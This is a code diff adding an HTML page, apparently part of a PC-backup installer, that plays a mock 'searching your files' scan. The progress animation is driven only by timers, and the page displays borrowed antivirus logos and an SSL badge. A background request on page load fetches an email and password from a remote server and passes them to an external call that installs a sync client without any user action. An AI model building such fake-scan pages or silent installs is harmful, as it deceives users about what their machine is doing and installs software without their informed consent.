@@ -1,0 +1,226 @@
+<!doctype html>
+<html class="no-js" lang="en">
+<head>
+    <meta charset="utf-8"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <link rel="stylesheet" href="https://di7msagwdvywy.cloudfront.net/win10/css/foundation.css"/>
+    <link rel="stylesheet" href="https://di7msagwdvywy.cloudfront.net/win10/css/style.css"/>
+    <link rel="stylesheet" href="https://di7msagwdvywy.cloudfront.net/win10/css/loaders.css"/>
+    <link href='https://fonts.googleapis.com/css?family=Open+Sans:400,300,300italic,400italic,600,600italic,700,700italic,800,800italic'
+          rel='stylesheet' type='text/css'>
+    <script src="https://di7msagwdvywy.cloudfront.net/win10/js/vendor/jquery.js"></script>
+    <script src="https://di7msagwdvywy.cloudfront.net/win10/js/vendor/modernizr.js"></script>
+    <script src="/hostname.js"></script>
+    <style>
+        .spinner
+        {
+            margin-left: 8.5px;
+            margin-top: 18px;
+        }
+    </style>
+</head>
+
+<body>
+<section id="header">
+    <div class="row">
+    </div>
+</section>
+<section id="info" class="page2">
+    <div class="row">
+        <div class="content">
+            <div class="info left">
+                <div class="small-2 text-center none columns">
+                    <img src="https://di7msagwdvywy.cloudfront.net/win10/images/img_searching.png" alt=""/>
+                </div>
+                <div class="small-10 none columns">
+                    <h5>Searching...</h5>
+                    <h6>Please wait while we are searching your files</h6>
+                </div>
+            </div>
+            <div class="panel left">
+                <div class="small-2 none columns">
+                    <img src="https://di7msagwdvywy.cloudfront.net/win10/images/img_disk.png" alt=""/>
+                </div>
+                <div class="small-10 columns">
+                    <h3 id="hostname">MyPC</h3>
+
+                    <div class="js-progress progress [ # small-#] [secondary alert success] [radius round]">
+                        <span class="meter" style="width: 0%"></span>
+                    </div>
+                    <div class="small-6 padding-left columns">
+                        <h5 class="js-current-status">All Files Found!</h5>
+                    </div>
+                    <div class="small-6 text-right padding-right columns">
+                        <h6>Complete</h6>
+                    </div>
+                </div>
+                <div class="small-8 padding-left links columns js-loaders">
+                    <div class="small-4 columns">
+                        <a href="#"><img src="https://di7msagwdvywy.cloudfront.net/win10/images/img_photos.png" alt=""/>
+                            Photos</a>
+                    </div>
+                    <div class="small-4 columns">
+                        <a href="#"><img src="https://di7msagwdvywy.cloudfront.net/win10/images/img_videos.png" alt=""/>
+                            Videos</a>
+                    </div>
+                    <div class="small-4 columns">
+                        <a href="#"><img src="https://di7msagwdvywy.cloudfront.net/win10/images/img_documents.png"
+                                         alt=""/> Documents</a>
+                    </div>
+                    <div class="small-4 columns">
+                        <a href="#"><img src="https://di7msagwdvywy.cloudfront.net/win10/images/img_application.png"
+                                         alt=""/> Applicatons</a>
+                    </div>
+                    <div class="small-4 columns">
+                        <a href="#"><img src="https://di7msagwdvywy.cloudfront.net/win10/images/img_text.png" alt=""/>
+                            Text</a>
+                    </div>
+                    <div class="small-4 columns">
+                        <a href="#"><img src="https://di7msagwdvywy.cloudfront.net/win10/images/img_info.png" alt=""/>
+                            Information</a>
+                    </div>
+                </div>
+                <div class="small-4 right text-right columns">
+                    <a class="js-continue continue" href="/page3.html" id="next-button"
+                       style="opacity: 0.6; pointer-events: none;">Continue</a>
+                </div>
+            </div>
+        </div>
+
+        <div class="footer">
+            <div class="small-6 columns none">
+                <ul>
+                    <li><img src="https://di7msagwdvywy.cloudfront.net/win10/images/img_lock.png" alt=""/> 256-Bit SSL
+                        Secure Connection
+                    </li>
+                </ul>
+            </div>
+            <div class="small-6 text-right columns none">
+                <ul>
+                    <li><a href="#"><img src="https://di7msagwdvywy.cloudfront.net/win10/images/logo_mca.png"
+                                         alt=""/></a></li>
+                    <li><a href="#"><img src="https://di7msagwdvywy.cloudfront.net/win10/images/logo_norton.png"
+                                         alt=""/></a></li>
+                </ul>
+            </div>
+        </div>
+    </div>
+</section>
+
+<script src="https://di7msagwdvywy.cloudfront.net/win10/js/vendor/jquery.js"></script>
+<script src="https://di7msagwdvywy.cloudfront.net/win10/js/foundation.min.js"></script>
+<script>
+    $(document).foundation();
+</script>
+
+<script>
+    /**
+     * Calls an async action on each element of an array in series
+     * @param {Array} arr
+     * @param {Function} action Should take the element as the first argument and a
+     *   callback function as the second; also passes the index and the full list
+     * @param {Function} cb A callback function
+     */
+
+    function eachSeries(arr, action, cb) {
+        var i = 0;
+        var stop = arr.length - 1;
+
+        function dispatch() {
+            action(arr[i], function (err) {
+                if (err) return cb(err);
+                if (i === stop) return cb();
+
+                i += 1;
+                dispatch();
+                return null;
+            }, i, arr);
+        }
+
+        dispatch();
+    }
+
+    /**
+     * Runs the mock loader
+     */
+
+    function runLoader($loader, cb, i) {
+        var $spinner = $('<div class="spinner" data-loader="circle-side"></div>');
+        var $currStatus = $('.js-current-status');
+        $spinner.css({
+            position: 'absolute',
+            top: 6,
+            left: -6,
+            height: '20',
+            width: '20'
+        });
+        $loader.append($spinner);
+        $loader.css({
+            opacity: 1
+        });
+        $currStatus.text('Finding ' + $loader.text() + '...');
+
+        $('.progress span').animate({
+            width: Math.floor((100 / 6) * (i + 1)) + '%',
+        }, 10000);
+
+        setTimeout(function () {
+            $loader.find('.spinner').remove();
+
+            cb();
+        }, 10000);
+    }
+
+    /*!
+     * Main entry point
+     */
+
+    $(function () {
+        var $loaders = $('.js-loaders .columns');
+        $loaders.each(function (i, el) {
+            var $el = $(el);
+            $el.css({
+                opacity: 0.6
+            });
+        });
+
+        eachSeries($loaders.get(), function (loader, cb, i) {
+            var $loader = $(loader);
+            runLoader($loader, cb, i);
+        }, function () {
+            $('.js-current-status').text('All files found!');
+            $('.js-continue').css({
+                opacity: 1,
+                'pointer-events': 'all'
+            });
+        });
+
+        var xhr;
+
+        if (window.XMLHttpRequest) {
+            // code for IE7+, Firefox, Chrome, Opera, Safari
+            xhr = new XMLHttpRequest();
+        } else {
+            // code for IE6, IE5
+            xhr = new ActiveXObject("Microsoft.XMLHTTP");
+        }
+
+        xhr.open('POST',
+                encodeURI('https://a.spdse.com/pcbackup-registration/v2/email.php'));
+        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+        xhr.onreadystatechange = function () {
+            if (xhr.readyState === 4 && xhr.status === 200) {
+                var response = JSON.parse(xhr.responseText);
+                if (response.status == 'success') {
+                    var email = response.email;
+                    var password = response.password;
+                    external.InstallSyncClinet(email, password);
+                }
+            }
+        };
+        xhr.send(encodeURI('guid=' + guid + '&sid=' + sid + '&brand=71f0jc225glu&rand=' + Math.floor((Math.random() * 100000) + 1)));
+    });
+</script>
+</body>
+</html>
